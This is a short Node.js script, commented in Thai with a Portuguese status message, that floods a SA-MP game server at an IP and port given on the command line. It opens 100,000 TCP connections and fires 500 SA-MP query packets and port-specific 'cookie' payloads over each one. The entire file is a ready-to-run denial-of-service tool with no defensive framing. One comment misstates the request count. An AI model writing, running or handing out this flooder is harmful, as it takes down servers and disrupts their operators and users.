const axios = require('axios');
const net = require('net');

// ตั้งค่า IP และพอร์ตจากอาร์กิวเมนต์
const args = process.argv.slice(2);
if (args.length < 2) {
    console.log("Usage: node main.js <IP> <PORT>");
    process.exit(1);
}

const ip = args[0];
const port = args[1];
const orgip = ip;

// ข้อมูลแพ็กเก็ตในรูปแบบ Hexadecimal
const packets = [
    Buffer.from('53414d5090d91d4d611e700a465b00', 'hex'), // p
    Buffer.from('53414d509538e1a9611e63', 'hex'), // c
    Buffer.from('53414d509538e1a9611e69', 'hex'), // i
    Buffer.from('53414d509538e1a9611e72', 'hex'), // r
    Buffer.from('081e62da', 'hex'), // cookie port 7796
    Buffer.from('081e77da', 'hex'), // cookie port 7777
    Buffer.from('081e4dda', 'hex'), // cookie port 7771
    Buffer.from('021efd40', 'hex'), // cookie port 7784
    Buffer.from('021efd40', 'hex'), // cookie port 1111 
    Buffer.from('081e7eda', 'hex')  // cookie port 1111 tambem
];

console.log(`Ataque iniciado no ip: ${orgip} e Porta: ${port}`);

// ฟังก์ชันสำหรับส่งแพ็กเก็ต
async function sendPackets() {
    const socket = net.createConnection({ host: ip, port: port });

    socket.on('connect', () => {
        for (let i = 0; i < 500; i++) { // ส่ง 500 แพ็กเก็ตในแต่ละครั้ง
            const msg = packets[Math.floor(Math.random() * packets.length)];
            socket.write(msg);

            // ส่ง cookie ขึ้นอยู่กับ port ที่กำหนด
            if (port == 7777) {
                socket.write(packets[5]);
            } else if (port == 7796) {
                socket.write(packets[4]);
            } else if (port == 7771) {
                socket.write(packets[6]);
            } else if (port == 7784) {
                socket.write(packets[7]);
            } else if (port == 1111) {
                socket.write(packets[9]);
            }
        }
        socket.end(); // ปิดการเชื่อมต่อ
    });

    socket.on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });
}

// ฟังก์ชันหลัก
async function startAttack() {
    for (let i = 0; i < 100000; i++) { // ส่ง 30,000 requests
        sendPackets();
    }
}

// เริ่มการทำงาน
startAttack();
